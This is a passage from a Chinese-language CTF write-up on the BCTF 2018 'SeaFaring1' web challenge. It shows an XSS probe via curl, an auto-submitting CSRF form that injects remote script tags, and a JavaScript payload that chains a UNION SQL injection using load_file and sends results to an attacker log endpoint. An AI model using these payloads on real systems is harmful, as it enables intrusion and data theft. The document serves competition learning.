<span class="number">0</span>; i &lt; data.<span class="property">length</span>; i++) &#123;</span><br><span class="line">                        <span class="keyword">var</span> <span class="title class_">Time</span> = data[i][<span class="number">0</span>];</span><br><span class="line">                        <span class="keyword">var</span> <span class="title class_">Username</span> = data[i][<span class="number">1</span>];</span><br><span class="line">                        <span class="keyword">var</span> <span class="title class_">Uid</span> = data[i][<span class="number">2</span>];</span><br><span class="line">                        <span class="keyword">var</span> <span class="title class_">Status</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="built_in">parseInt</span>(data[i][<span class="number">3</span>]) == <span class="number">1</span>) &#123;</span><br><span class="line">                            <span class="title class_">Status</span> = <span class="string">&#x27;&lt;div style=&quot;color:#04FF00&quot;&gt;Checked&lt;/div&gt;&#x27;</span>;</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="title class_">Status</span> = <span class="string">&#x27;&lt;div style=&quot;color:#FFA500&quot;&gt;Not Checked&lt;/div&gt;&#x27;</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        html += <span class="string">&quot;&lt;tr&gt; &lt;td &gt; &lt;center&gt; &quot;</span> + <span class="title class_">Time</span> + <span class="string">&quot; &lt;/center&gt;&lt;/td&gt; &lt;td&gt; &lt;center&gt; &quot;</span> + <span class="title class_">Username</span> + <span class="string">&quot; &lt;/center&gt;&lt;/td&gt; &lt;td&gt; &lt;center&gt; &lt;a onclick = view_uid(&#x27;&quot;</span> + <span class="title class_">Uid</span> + <span class="string">&quot;&#x27;) &gt; &quot;</span> + <span class="title class_">Uid</span> + <span class="string">&quot; &lt;/a&gt;&lt;/center&gt; &lt;/td&gt; &lt;td&gt; &lt;center&gt; &quot;</span> + <span class="title class_">Status</span> + <span class="string">&quot; &lt;/center&gt;&lt;/td&gt; &lt;/tr&gt;&quot;</span></span><br><span class="line">                    &#125;</span><br><span class="line">                    tbody.<span class="property">innerHTML</span> = html;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    <span class="title function_">alert</span>(<span class="string">&#x27;Error: &#x27;</span> + data[<span class="string">&quot;error&quot;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">set_reply</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> uid = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;replyuid&quot;</span>).<span class="property">value</span>;</span><br><span class="line">        <span class="keyword">var</span>  reply =  <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;replymessage&quot;</span>).<span class="property">value</span>;</span><br><span class="line">        $.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">            <span class="attr">type</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">            <span class="attr">url</span>: <span class="string">&quot;/admin/handle_message.php&quot;</span>,</span><br><span class="line">            <span class="attr">data</span>: &#123;<span class="string">&quot;token&quot;</span>: csrf_token, <span class="string">&quot;action&quot;</span>: <span class="string">&quot;set_reply&quot;</span>, <span class="string">&quot;uid&quot;</span>: uid, <span class="string">&quot;reply&quot;</span>: reply&#125;,</span><br><span class="line">            <span class="attr">dataType</span>: <span class="string">&quot;json&quot;</span>,</span><br><span class="line">            <span class="attr">success</span>: <span class="keyword">function</span> (<span class="params">data</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!data[<span class="string">&quot;error&quot;</span>]) &#123;</span><br><span class="line">                    data = data[<span class="string">&#x27;result&#x27;</span>];</span><br><span class="line">                    <span class="title function_">alert</span>(<span class="string">&#x27;Succ: &#x27;</span> + data);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    <span class="title function_">alert</span>(<span class="string">&#x27;Error: &#x27;</span> + data[<span class="string">&quot;error&quot;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">load_all</span>(<span class="params"></span>) &#123;</span><br><span class="line">        $.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">            <span class="attr">type</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">            <span class="attr">url</span>: <span class="string">&quot;/admin/handle_message.php&quot;</span>,</span><br><span class="line">            <span class="attr">data</span>: &#123;<span class="string">&quot;token&quot;</span>: csrf_token, <span class="string">&quot;action&quot;</span>: <span class="string">&quot;load_all&quot;</span>&#125;,</span><br><span class="line">            <span class="attr">dataType</span>: <span class="string">&quot;json&quot;</span>,</span><br><span class="line">            <span class="attr">success</span>: <span class="keyword">function</span> (<span class="params">data</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!data[<span class="string">&quot;error&quot;</span>]) &#123;</span><br><span class="line">                    data = data[<span class="string">&#x27;result&#x27;</span>];</span><br><span class="line">                    <span class="keyword">var</span> html = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">                    <span class="keyword">var</span> tbody = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;comments&quot;</span>);</span><br><span class="line">                    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; data.<span class="property">length</span>; i++) &#123;</span><br><span class="line">                        <span class="keyword">var</span> <span class="title class_">Time</span> = data[i][<span class="number">0</span>];</span><br><span class="line">                        <span class="keyword">var</span> <span class="title class_">Username</span> = data[i][<span class="number">1</span>];</span><br><span class="line">                        <span class="keyword">var</span> <span class="title class_">Uid</span> = data[i][<span class="number">2</span>];</span><br><span class="line">                        <span class="keyword">var</span> <span class="title class_">Status</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="built_in">parseInt</span>(data[i][<span class="number">3</span>]) == <span class="number">1</span>) &#123;</span><br><span class="line">                            <span class="title class_">Status</span> = <span class="string">&#x27;&lt;div style=&quot;color:#04FF00&quot;&gt;Checked&lt;/div&gt;&#x27;</span>;</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="title class_">Status</span> = <span class="string">&#x27;&lt;div style=&quot;color:#FFA500&quot;&gt;Not Checked&lt;/div&gt;&#x27;</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        html += <span class="string">&quot;&lt;tr&gt; &lt;td &gt; &lt;center&gt; &quot;</span> + <span class="title class_">Time</span> + <span class="string">&quot; &lt;/center&gt;&lt;/td&gt; &lt;td&gt; &lt;center&gt; &quot;</span> + <span class="title class_">Username</span> + <span class="string">&quot; &lt;/center&gt;&lt;/td&gt; &lt;td&gt; &lt;center&gt; &lt;a onclick = view_uid(&#x27;&quot;</span> + <span class="title class_">Uid</span> + <span class="string">&quot;&#x27;) &gt; &quot;</span> + <span class="title class_">Uid</span> + <span class="string">&quot; &lt;/a&gt;&lt;/center&gt; &lt;/td&gt; &lt;td&gt; &lt;center&gt; &quot;</span> + <span class="title class_">Status</span> + <span class="string">&quot; &lt;/center&gt;&lt;/td&gt; &lt;/tr&gt;&quot;</span></span><br><span class="line">                    &#125;</span><br><span class="line">                    tbody.<span class="property">innerHTML</span> = html;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    <span class="title function_">alert</span>(<span class="string">&#x27;Error: &#x27;</span> + data[<span class="string">&quot;error&quot;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">setTimeout</span>(load_all, <span class="number">1000</span>);</span><br></pre></td></tr></table></figure>
+
+<p>发现<code>/admin/handle_message.php</code>存在xss</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">blacsheep@Macbook:/home/blacsheep  $ curl -X POST -d <span class="string">&quot;token=&lt;img src=1 onerror=alert(/xss/)&gt;&amp;action=view_id&amp;uid=1&quot;</span> <span class="string">&#x27;http://seafaring.xctf.org.cn:9999/admin/handle_message.php&#x27;</span></span><br><span class="line">&#123;<span class="string">&quot;result&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;error&quot;</span>:<span class="string">&quot;CSRFToken  &#x27;&lt;img src=1 onerror=alert(\/xss\/)&gt;&#x27;is not correct&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>构造一个html页面让bot去访问</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">    window.onload =function()&#123;</span><br><span class="line">    document.getElementById(&quot;f&quot;).submit();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">    &lt;form method=&quot;post&quot; action=&quot;http://seafaring.xctf.org.cn:9999/admin/handle_message.php&quot;    id=&quot;f&quot;&gt;</span><br><span class="line">            &lt;input type=&quot;hidden&quot; name=&quot;token&quot; value=&quot;&lt;script src=http://t.cn/ELTmXGg&gt;&lt;/script&gt;&lt;script src=http://localhost/bctf_evil_oqwej98czc.js&gt;&lt;/script&gt;&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;hidden&quot; name=&quot;action&quot; value=&quot;view_id&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;hidden&quot; name=&quot;uid&quot; value=&quot;1&quot;&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>外部引入的js文件(改自Nu1l的师傅)</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">req</span>(<span class="params">url,data</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">    xhr.<span class="title function_">open</span>(<span class="string">&quot;POST&quot;</span>,url,<span class="literal">false</span>);</span><br><span class="line">    xhr.<span class="title function_">setRequestHeader</span>(<span class="string">&quot;Content-Type&quot;</span>,<span class="string">&quot;application/x-www-formurlencoded&quot;</span>);</span><br><span class="line">    xhr.<span class="title function_">send</span>(data);</span><br><span class="line">    <span class="keyword">var</span> resp = xhr.<span class="property">responseText</span>;</span><br><span class="line">    <span class="keyword">return</span> resp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">get_csrf_token</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">    xhr.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>,<span class="string">&quot;http://seafaring.xctf.org.cn:9999/admin/index.php&quot;</span>,<span class="literal">false</span>);</span><br><span class="line">    xhr.<span class="title function_">send</span>();</span><br><span class="line">    <span class="keyword">var</span> res = xhr.<span class="property">responseText</span>;</span><br><span class="line">    <span class="keyword">var</span> csrftoken = res.<span class="title function_">match</span>(<span class="regexp">/csrf_token = \&quot;([a-z0-9]*)\&quot;/ig</span>)[<span class="number">0</span>].<span class="title function_">split</span>(<span class="string">&#x27;=&quot;&#x27;</span>)[<span class="number">1</span>].<span class="title function_">replace</span>(<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> csrftoken;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">send</span>(<span class="params">data</span>)&#123;</span><br><span class="line">    location.<span class="property">href</span> = <span class="string">&quot;http://localhost/log.php?data=&quot;</span>+<span class="built_in">escape</span>(data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> ress=<span class="title function_">req</span>(<span class="string">&quot;http://172.20.0.2:6379/&quot;</span>,<span class="string">&quot;token=&quot;</span>+<span class="title function_">get_csrf_token</span>()+<span class="string">&quot;&amp;action=view_unreads&amp;status=3%20%20and%201%3D2%20union%20select%201%2Cload_file%280x2f70726f632f6e65742f617270%29%2C3%2C4%20from%20f111111ag%23&quot;</span>);</span><br><span class="line"><span class="title function_">send</span>(ress);</span><br></pre></td></tr></table></figure>
+
+<p>然后就可以在vps上面收结果了 不过复现的时候发现并没有收到结果 看了下日志发现bot只是访问了csrf页面而并没有载入js文件…不太清楚原因 访问成功之后就发现是个后台的sql注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;result&quot;:&quot;&quot;,&quot;error&quot;:&quot;sql query error! debug info:SELECT</span><br><span class="line">timestamp,user_name,uid,is_checked,message FROM feedbacks where uid=&#x27;1\\&#x27;or</span><br><span class="line">1#&#x27; ORDER BY id DESC &quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>用了addslashes,但是有一个接口是整形注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;result&quot;:&quot;&quot;,&quot;error&quot;:&quot;sql query error! debug info:SELECT</span><br><span class="line">timestamp,user_name,uid,is_checked FROM feedbacks where is_checked=1\\&#x27;</span><br><span class="line">ORDER BY id DESC limit 0,50&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>直接跑就拿到flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;result&quot;:[[&quot;1&quot;,&quot;bctf&#123;XsS_SQL1_7438x_2xfccmk&#125;&quot;,&quot;3&quot;,&quot;4&quot;]],&quot;error&quot;:&quot;&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>自己做的时候发现的xss是登录界面的xss…没发现后台的token可以xss…登录处的触发需要撞验证码…所以post了几百个包..后来发现bot访问地超级慢第二天就被查水表2333… 不过思路没啥问题,csrf控制bot去触发xss载入js文件,当时想法是如果打到xss看下后台页面存不存在其他有用的东西,不过xss找错了,很可惜…不过反正也不会csrf…收了Nu1l师傅的csrfpayload了ORZ</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/categories/">Category</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#checkin"><span class="toc-number">1.</span> <span class="toc-text">checkin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#babySQLiSPA"><span class="toc-number">2.</span> <span class="toc-text">babySQLiSPA</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SeaFaring1"><span class="toc-number">3.</span> <span class="toc-text">SeaFaring1</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2018/11/29/bctf2018webpart1/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2018/11/29/bctf2018webpart1/&text=BCTF2018web(part1)"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2018/11/29/bctf2018webpart1/&title=BCTF2018web(part1)"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2018/11/29/bctf2018webpart1/&is_video=false&description=BCTF2018web(part1)"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=BCTF2018web(part1)&body=Check out this article: http://example.com/2018/11/29/bctf2018webpart1/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2018/11/29/bctf2018webpart1/&title=BCTF2018web(part1)"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2018/11/29/bctf2018webpart1/&title=BCTF2018web(part1)"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2018/11/29/bctf2018webpart1/&title=BCTF2018web(part1)"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2018/11/29/bctf2018webpart1/&title=BCTF2018web(part1)"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2018/11/29/bctf2018webpart1/&name=BCTF2018web(part1)&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2018/11/29/bctf2018webpart1/&t=BCTF2018web(part1)"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2023
+    blacsheep
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
